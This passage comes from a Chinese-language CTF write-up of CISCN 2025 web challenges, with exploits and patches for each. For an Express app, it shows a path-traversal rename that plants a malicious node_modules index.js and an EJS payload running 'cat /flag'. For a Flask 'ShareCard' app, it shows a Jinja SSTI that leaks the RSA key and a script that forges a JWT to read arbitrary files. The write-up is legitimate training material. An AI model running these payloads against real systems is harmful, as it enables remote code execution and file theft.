class="line"></span><br><span class="line">        <span class="comment">// 获取当前字符</span></span><br><span class="line">        <span class="keyword">const</span> char = <span class="title class_">String</span>.<span class="title function_">fromCodePoint</span>(codePoint);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 转换为小写</span></span><br><span class="line">        <span class="keyword">const</span> lowerChar = char.<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查转换结果是否为目标字符</span></span><br><span class="line">        <span class="keyword">if</span> (lowerChar === targetChar) &#123;</span><br><span class="line">            results.<span class="title function_">push</span>(&#123;</span><br><span class="line">                <span class="attr">codePoint</span>: codePoint.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">toUpperCase</span>(),</span><br><span class="line">                <span class="attr">original</span>: char,</span><br><span class="line">                <span class="attr">lowerCase</span>: lowerChar</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行函数并获取结果</span></span><br><span class="line"><span class="keyword">const</span> charactersConvertingToE = <span class="title function_">findCharactersConvertingToTarget</span>(targetCharacter);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Characters converting to &#x27;<span class="subst">$&#123;targetCharacter&#125;</span>&#x27;:`</span>);</span><br><span class="line">charactersConvertingToE.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`U+<span class="subst">$&#123;item.codePoint&#125;</span>: &#x27;<span class="subst">$&#123;item.original&#125;</span>&#x27; -&gt; &#x27;<span class="subst">$&#123;item.lowerCase&#125;</span>&#x27;`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Total: <span class="subst">$&#123;charactersConvertingToE.length&#125;</span> characters.`</span>);</span><br></pre></td></tr></table></figure>

<p>render存在ssti，endsWith是区分大小写的，但Ejs这种后缀也可以解析，或者直接不写后缀，也可以解析对应的ejs文件<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/3.png" alt="alt text"></p>
<p>还有个上传的路由，可以上传不是ejs后缀的文件<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/4.png" alt="alt text"></p>
<p>rename路由很容易想到是否可以把上传的文件重命名为ejs，但是尝试之后没成功<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/5.png" alt="alt text"></p>
<p>但是rename在重命名的时候提供了创建文件夹和路径穿越的功能，相当于可以把我们的上传的文件放在任意文件夹下</p>
<p>接下来是低版本express的一个trick</p>
<p>当我们传入的filename没有后缀的时候，render会自动加入默认设置的.ejs，当我们传入的filename有后缀时，会取最后一个后缀进行require，假设filename&#x3D;1.js.abc，那么就会require(‘abc’)，为什么会这样，我们追踪下源码，res.render处打个断点<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/6.png" alt="alt text"></p>
<p>view在没cache的情况下view变量默认是空的，就会在此处调用一个View()，而且当这个函数结束的时候，他会继续走一个tryRender函数，看View函数内容</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">View</span>(<span class="params">name, options</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> opts = options || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">defaultEngine</span> = opts.<span class="property">defaultEngine</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">ext</span> = <span class="title function_">extname</span>(name);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">root</span> = opts.<span class="property">root</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">ext</span> &amp;&amp; !<span class="variable language_">this</span>.<span class="property">defaultEngine</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;No default engine was specified and no extension was provided.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> fileName = name;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">ext</span>) &#123;</span><br><span class="line">    <span class="comment">// get extension from default engine name</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">ext</span> = <span class="variable language_">this</span>.<span class="property">defaultEngine</span>[<span class="number">0</span>] !== <span class="string">&#x27;.&#x27;</span></span><br><span class="line">      ? <span class="string">&#x27;.&#x27;</span> + <span class="variable language_">this</span>.<span class="property">defaultEngine</span></span><br><span class="line">      : <span class="variable language_">this</span>.<span class="property">defaultEngine</span>;</span><br><span class="line"></span><br><span class="line">    fileName += <span class="variable language_">this</span>.<span class="property">ext</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!opts.<span class="property">engines</span>[<span class="variable language_">this</span>.<span class="property">ext</span>]) &#123;</span><br><span class="line">    <span class="comment">// load engine</span></span><br><span class="line">    <span class="keyword">var</span> mod = <span class="variable language_">this</span>.<span class="property">ext</span>.<span class="title function_">slice</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">debug</span>(<span class="string">&#x27;require &quot;%s&quot;&#x27;</span>, mod)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// default engine export</span></span><br><span class="line">    <span class="keyword">var</span> fn = <span class="built_in">require</span>(mod).<span class="property">__express</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Module &quot;&#x27;</span> + mod + <span class="string">&#x27;&quot; does not provide a view engine.&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    opts.<span class="property">engines</span>[<span class="variable language_">this</span>.<span class="property">ext</span>] = fn</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// store loaded engine</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">engine</span> = opts.<span class="property">engines</span>[<span class="variable language_">this</span>.<span class="property">ext</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// lookup path</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">path</span> = <span class="variable language_">this</span>.<span class="title function_">lookup</span>(fileName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点在这<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/7.png" alt="alt text"></p>
<p>this.ext是我们传入的最后一个后缀，去掉.传给了mod，然后被require，require默认是读取node_modules中的index.js，假设这里mod是js，那么就会require node_modules&#x2F;js&#x2F;index.js，也就是说我们能控制node_modules下的文件内容的话就能rce了，刚好这里的rename可以实现目录穿越写入node_modules中，我们先随便上传个index.js，内容为:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br><span class="line">p.<span class="title function_">exec</span>(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rename?oldPath=index.js&amp;newPath=../node_modules/F12/index.js</span><br><span class="line">rce：render?filename=1.F12</span><br></pre></td></tr></table></figure>

<p>fix也很简单，把.js加入黑名单就行<br>目录穿越也可以ban了<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/8.png" alt="alt text"></p>
<p>疑似非预期的解法<br>render 传参 .ejs&#x2F;…&#x2F; 绕过 render 检验</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)%&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">mv</span> app.js /app/app.js</span><br><span class="line"><span class="built_in">chmod</span> 777 /app/app.js</span><br></pre></td></tr></table></figure>

<h2 id="ShareCard"><a href="#ShareCard" class="headerlink" title="ShareCard"></a>ShareCard</h2><p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, url_for, redirect, current_app</span><br><span class="line"><span class="keyword">from</span> jinja2.sandbox <span class="keyword">import</span> SandboxedEnvironment</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SaferSandboxedEnvironment</span>(<span class="title class_ inherited__">SandboxedEnvironment</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_safe_attribute</span>(<span class="params">self, obj, attr: <span class="built_in">str</span>, value</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_safe_callable</span>(<span class="params">self, obj</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Info</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    avatar: <span class="built_in">str</span></span><br><span class="line">    signature: <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_avatar</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.avatar = base64.b64encode(<span class="built_in">open</span>(<span class="string">&#x27;avatars/&#x27;</span>+<span class="variable language_">self</span>.avatar,<span class="string">&#x27;rb&#x27;</span>).read()).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safer_render_template</span>(<span class="params">template_name, **kwargs</span>):</span><br><span class="line">    env = SaferSandboxedEnvironment(loader=current_app.jinja_env.loader)</span><br><span class="line">    <span class="keyword">return</span> env.from_string(<span class="built_in">open</span>(<span class="string">&#x27;templates/&#x27;</span>+template_name).read()).render(**kwargs)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">rsakey = RSA.generate(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/createCard&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_card</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> safer_render_template(<span class="string">&quot;create.html&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.form.get(<span class="string">&#x27;style&#x27;</span>)!=<span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">&#x27;templates/style.css&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(request.form.get(<span class="string">&#x27;style&#x27;</span>))</span><br><span class="line">    info=Info(**request.form)</span><br><span class="line">    <span class="keyword">if</span> info.avatar <span class="keyword">not</span> <span class="keyword">in</span> os.listdir(<span class="string">&#x27;avatars&#x27;</span>):</span><br><span class="line">        <span class="keyword">raise</span> FileNotFoundError</span><br><span class="line">    token = jwt.encode(<span class="built_in">dict</span>(info), rsakey.exportKey(), algorithm=<span class="string">&quot;RS256&quot;</span>)</span><br><span class="line">    share_url = request.url_root + url_for(<span class="string">&#x27;show_card&#x27;</span>, token=token)</span><br><span class="line">    qr_img = BytesIO()</span><br><span class="line">    qrcode.make(share_url).save(qr_img,<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line">    qr_img.seek(<span class="number">0</span>)</span><br><span class="line">    share_img = base64.b64encode(qr_img.getvalue()).decode()</span><br><span class="line">    <span class="keyword">return</span> safer_render_template(<span class="string">&quot;created.html&quot;</span>, share_url=share_url, share_img=share_img)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/showCard&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_card</span>():</span><br><span class="line">    token = request.args.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    data = jwt.decode(token, rsakey.publickey().exportKey(), algorithms=jwt.algorithms.get_default_algorithms())</span><br><span class="line">    info = Info(**data)</span><br><span class="line">    info.parse_avatar()</span><br><span class="line">    <span class="keyword">return</span> safer_render_template(<span class="string">&quot;show.html&quot;</span>, info=info)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;create_card&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>很明显，这里会读取文件内容base64编码返回<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/9.png" alt="alt text"></p>
<p>如果我们能够控制avatar&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd，我们就可以任意读文件了，而这个值是从token中解密得到的。也就是我们必须想办法伪造我们的恶意token，而我们的token是用jwt的rs256加密的<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/10.png" alt="alt text"></p>
<p>然后这里还有两个ssti<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/11.png" alt="alt text"></p>
<p>但是这里还有限制，只能读属性，不能调用callable 函数，说明不能rce，但是可以读rsakey<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/12.png" alt="alt text"></p>
<p>接下来就是怎么ssti了，这里有个很奇怪的功能，就是可以写style<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/13.png" alt="alt text"></p>
<p>这里直接include了我们可以写的style.css，正常的写法是像上面那样写<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/14.png" alt="alt text"></p>
<p>既然可以include，我们直接拼接来ssti<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/15.png" alt="alt text"><br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/16.png" alt="alt text"></p>
<p>在可以ssti的条件下现在我们来考虑怎么读rsakey<br>这里我们本地先调试一下</p>
<p>这里的话要取 info 的属性，因为 info 是调用Info类得到的，Info类下有parse_avatar这个全局方法，然后需要在 &#x2F;showCard 路由下查看style，因为这里才有info，而 &#x2F;createCard 则会报错但没关系</p>
<p>那么读rsakey</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info.__class__.parse_avatar.__globals__.__getitem__(&#x27;rsakey&#x27;).publickey().exportKey()</span><br></pre></td></tr></table></figure>
<p><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/17.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info.__class__.parse_avatar.__globals__.__getitem__(&#x27;rsakey&#x27;).exportKey()</span><br></pre></td></tr></table></figure>
<p><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/18.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;info.__class__.parse_avatar.__globals__&#125;&#125;，报错了，不过无所谓</span><br></pre></td></tr></table></figure>
<p><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/19.png" alt="alt text"></p>
<p>这里只要给它正常的token就不报错，得到rsakey</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![alt text](20.png)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name=1&amp;avatar=%F0%9F%A4%A1.svg&amp;signature=7*7&amp;style=&lt;/style&gt;</span><br><span class="line">   &#123;&#123;info.__class__.parse_avatar.__globals__&#125;&#125;</span><br><span class="line">&#123;&#123;7*7&#125;&#125;</span><br><span class="line">&lt;style&gt;</span><br></pre></td></tr></table></figure>

<p>这里写个脚本来得到publickey和privatekey</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey.RSA <span class="keyword">import</span> RsaKey</span><br><span class="line">a = RsaKey(n=<span class="number">168847430506413632232758779998262041886095415651306627903844639769807505101122721915333525226451845552461432997694396485863356992519505258312851407042794613258187802636062493691470333386027479343582225457312830629407968204139014694417049193885039077195522230426232547258300958117051629795564704141112563342317</span>, e=<span class="number">65537</span>, d=<span class="number">58684510613471622365957848098027263836939154640973226885481074884060536051289704438522773969026963974456666017997207122007347690245346762498285386111979112695931741355577195267733375552126424175891603880833791426515194317841598959724479664325077615305203684574455749621267890578034651143810527598493647253657</span>, p=<span class="number">12780798986926360516066912983561284634517903628158644181120044713618219509596753657724383431129390676550412389626771170734078167682242671292334242294734999</span>, q=<span class="number">13211023088551019799809936126119425895962064230649348946782191145971976890687993393060472166746897955967310528034942787711754545685545170585078339310662683</span>, u=<span class="number">445179507521355119116415121827634627579291254360873107183756519332790086792266254850675911860654307044235880800935795988955895875416496978288327978913093</span>)</span><br><span class="line"><span class="built_in">print</span>(a.export_key().decode())</span><br><span class="line"><span class="built_in">print</span>(a.public_key().export_key().decode())</span><br></pre></td></tr></table></figure>

<p>成功解密<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/21.png" alt="alt text"></p>
<p>还可以使用rsatool生成一个rsa私钥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 rsatool.py -f PEM -o private.pem -n 126123614477015775448789877206017292386336663012480330606083697181136984617708780170725665068837288536687956308850816616924015665300736823691410985286499563938666378049277495278535134451022151639249605836868202071595881433292992822004089702149441937221323083043604617381139486807424885868287782232845765278943 -d 16356021780675909418180038243647725223789238124159945219053440687588434506704715239803430541832066088977385914352550321608209242708561000115252482779955744104485540020656221986885376506975459291207812710017083944289037938520247378083893059236195153243903078926446378766613488506330804090368443881290180527489</span><br></pre></td></tr></table></figure>

<p>cyberchef也可以用来伪造jwt<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/27.png" alt="alt text"></p>
<p>修改avatar为..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/22.png" alt="alt text"></p>
<p>成功读到&#x2F;etc&#x2F;passwd<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/23.png" alt="alt text"></p>
<p>最终exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey.RSA <span class="keyword">import</span> RsaKey</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Info</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    avatar: <span class="built_in">str</span></span><br><span class="line">    signature: <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_avatar</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.avatar = base64.b64encode(<span class="built_in">open</span>(<span class="string">&#x27;avatars/&#x27;</span>+<span class="variable language_">self</span>.avatar,<span class="string">&#x27;rb&#x27;</span>).read()).decode()</span><br><span class="line">rsakey = RsaKey(n=<span class="number">150578113349205898488276292890099829389704668362565162059995081477317214405659763411677321600040650538234246341706811185256612685821470590192288260262833422179691345149780616046851112635772210271526453592527184426413222909270410889678801019514677783715580426838923931302662761057208469812736651721887467973411</span>, e=<span class="number">65537</span>, d=<span class="number">52653056053329828535126473076521243575524772762420076237055057214625935638300532038752206241471711675228422208671805827653587509569063746893229380598947488528218626065670559794191192592502048018501192362831817529832994394859149123508674228855018144606173522625084683679618604161317490521094088999515262188181</span>, p=<span class="number">11467872222303462592781090966597204328470121262204536176295456548804930456457258518405480667349859078900690861447977805174219051342776881544474886773592399</span>, q=<span class="number">13130431734001343813537751585004605159702109372048959793702371813691280191549458749092926017322209662167944140640359694300083187372654472989089287616990189</span>, u=<span class="number">203032258646615363878640478081210301207565868998325937320945830665975047861423174393933577299896298708631067218485168226553587516652972926456967628027984</span>)</span><br><span class="line"><span class="built_in">print</span>(rsakey.export_key().decode())</span><br><span class="line"><span class="built_in">print</span>(rsakey.public_key().export_key().decode())</span><br><span class="line">token = <span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiMSIsImF2YXRhciI6Ilx1ZDgzZVx1ZGQyMS5zdmciLCJzaWduYXR1cmUiOiI3KjcifQ.m10hrLYLszf_ab3ZlYonelJAmiW2kWdwt2jRgQDwemwybjAJ_9AdlXrh7fxuBrkXjmAKX1irYPj1RWVL32k3c_esIYmu1KhRNuH_nTser4Hqm75Ipl6wq-wtatsn9VCO222W7ode6yxgnfUbzYel3dq_e1nE1vWrLpdsZIqVKu4&quot;</span></span><br><span class="line">data = jwt.decode(token, rsakey.publickey().exportKey(), algorithms=jwt.algorithms.get_default_algorithms())</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&#x27;avatar&#x27;</span>])</span><br><span class="line">data[<span class="string">&#x27;avatar&#x27;</span>]=<span class="string">&#x27;../../../../../../flag&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">token = jwt.encode(data, rsakey.exportKey(), algorithm=<span class="string">&quot;RS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>

<p>成功读到<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/24.png" alt="alt text"></p>
<p>fix</p>
<p>删除include，然后用正常的方式导入<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/25.png" alt="alt text"></p>
<p>注意不能注释，注释了还是可以ssti，只不过结果在注释里</p>
<p>还可以把..ban掉，防止路径穿越<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/26.png" alt="alt text"></p>
<p>其它fix方法</p>
<p>发现sytle参数是没对后续执行点操作的。直接修改参数值即可，替换一个不存在的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/createCard&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_card</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> safer_render_template(<span class="string">&quot;create.html&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.form.get(<span class="string">&#x27;style&#x27;</span>)!=<span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">&#x27;templates/style.css&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(request.form.get(<span class="string">&#x27;stabcyle12344&#x27;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">mv</span> app.py /app/app.py</span><br><span class="line"><span class="built_in">chmod</span> 777 /app/app.py</span><br></pre></td></tr></table></figure>

<p>还有一种ban ssti的</p>
